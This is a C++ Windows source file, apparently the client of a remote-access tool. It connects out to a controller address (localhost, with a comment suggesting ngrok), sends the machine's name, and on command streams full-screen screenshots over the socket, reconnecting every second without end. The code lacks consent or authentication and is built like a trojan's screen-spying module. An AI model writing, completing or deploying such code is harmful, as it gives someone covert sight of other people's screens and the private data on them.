#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <vector>
#include <gdiplus.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Gdiplus.lib")

using namespace Gdiplus;

ULONG_PTR gdiplusToken;

void initGDIPlus() {
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);
}

void shutdownGDIPlus() {
    GdiplusShutdown(gdiplusToken);
}

std::vector<BYTE> saveHBitmapToPngBytes(HBITMAP hBitmap) {
    std::vector<BYTE> pngBytes;
    IStream* pStream = nullptr;
    CreateStreamOnHGlobal(nullptr, TRUE, &pStream);

    Bitmap bmp(hBitmap, nullptr);
    CLSID pngClsid;
    UINT numEncoders = 0, size = 0;
    GetImageEncodersSize(&numEncoders, &size);
    std::vector<BYTE> buffer(size);
    ImageCodecInfo* pImageCodecInfo = reinterpret_cast<ImageCodecInfo*>(buffer.data());
    GetImageEncoders(numEncoders, size, pImageCodecInfo);

    for (UINT i = 0; i < numEncoders; ++i) {
        if (wcscmp(pImageCodecInfo[i].MimeType, L"image/png") == 0) {
            pngClsid = pImageCodecInfo[i].Clsid;
            break;
        }
    }

    bmp.Save(pStream, &pngClsid, nullptr);

    STATSTG statstg;
    pStream->Stat(&statstg, STATFLAG_NONAME);
    ULONG sizeBytes = (ULONG)statstg.cbSize.QuadPart;

    pngBytes.resize(sizeBytes);
    LARGE_INTEGER liZero = {};
    pStream->Seek(liZero, STREAM_SEEK_SET, nullptr);
    ULONG bytesRead = 0;
    pStream->Read(pngBytes.data(), sizeBytes, &bytesRead);

    pStream->Release();
    return pngBytes;
}

std::vector<BYTE> capture_screen_to_bytes_by_dda() {
    int screenX = GetSystemMetrics(SM_CXSCREEN);
    int screenY = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreenDC = GetDC(nullptr);
    HDC hMemDC = CreateCompatibleDC(hScreenDC);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenX, screenY);
    HGDIOBJ hOld = SelectObject(hMemDC, hBitmap);

    BitBlt(hMemDC, 0, 0, screenX, screenY, hScreenDC, 0, 0, SRCCOPY);
    SelectObject(hMemDC, hOld);

    std::vector<BYTE> pngData = saveHBitmapToPngBytes(hBitmap);

    DeleteObject(hBitmap);
    DeleteDC(hMemDC);
    ReleaseDC(nullptr, hScreenDC);

    return pngData;
}

std::atomic<bool> streaming = false;

void startStreaming(SOCKET sock) {
    std::thread([sock]() {
        while (streaming) {
            std::vector<BYTE> img = capture_screen_to_bytes_by_dda();
            uint32_t size = static_cast<uint32_t>(img.size());
            send(sock, reinterpret_cast<const char*>(&size), sizeof(uint32_t), 0);
            send(sock, reinterpret_cast<const char*>(img.data()), (int)img.size(), 0);
            std::this_thread::sleep_for(std::chrono::milliseconds(66)); // 15 fps
        }
        }).detach();
}

int main() {
    initGDIPlus();

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Falha ao iniciar Winsock" << std::endl;
        return 1;
    }

    char compName[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD size = sizeof(compName);
    GetComputerNameA(compName, &size);

    while (true) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            Sleep(1000);
            continue;
        }

        BOOL opt = TRUE;
        setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, (const char*)&opt, sizeof(opt));

        sockaddr_in serverAddr = {};
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(59819); // xddd
        serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // you can use ngrok

        while (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            closesocket(sock);
            Sleep(1000);
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, (const char*)&opt, sizeof(opt));
        }

        send(sock, compName, (int)strlen(compName), 0);

        char buffer[256] = {};
        while (true) {
            int ret = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (ret <= 0) break;

            buffer[ret] = '\0';
            std::string command(buffer);

            if (command == "START_SCREEN") {
                if (!streaming) {
                    streaming = true;
                    startStreaming(sock);
                    std::cout << "Iniciando transmissão de tela\n";
                }
            }
            else if (command == "STOP_SCREEN") {
                if (streaming) {
                    streaming = false;
                    std::cout << "Parando transmissão de tela\n";
                }
            }
        }

        streaming = false;
        closesocket(sock);
        std::cerr << "Conexão perdida, reconectando em 1s..." << std::endl;
        Sleep(1000);
    }

    WSACleanup();
    shutdownGDIPlus();
    return 0;
}
